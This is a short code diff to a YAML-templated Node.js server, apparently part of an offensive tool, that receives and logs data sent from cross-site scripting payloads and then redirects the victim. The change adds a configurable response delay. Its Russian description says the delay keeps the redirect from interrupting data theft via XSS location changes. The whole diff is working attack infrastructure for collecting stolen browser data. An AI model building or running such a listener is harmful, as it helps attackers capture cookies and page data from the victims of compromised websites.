@@ -30,6 +30,14 @@ arguments:
     replacer: '#redirect#'
     metavar: URL
   
+  d:
+    default: '0'
+    description: задержка ответа сервера в милисекундах. Полезна для избегания перенаправления при получении данных от XSS с помощью смены location.
+    metavar: ms
+    replacer: '#delay#'
+    regex: '\d+'
+
+  
   log:
     default:
       -
@@ -55,6 +63,7 @@ script: |-
   const hostname = #ip#
   const port = #port#
   const redirect = #redirect#
+  const delay = #delay#
 
   const server = http.createServer((req, res) => {
     url_parts = url.parse(req.url, true);
@@ -65,7 +74,7 @@ script: |-
       console.log(`Data received from ${req.socket.remoteAddress}:\n${buff.toString('ascii')}`);
     };
     res.writeHeader(302, { 'Location': redirect});
-    res.end();
+    setTimeout(() => {res.end()}, delay);
     #logging#
     console.log();
   })
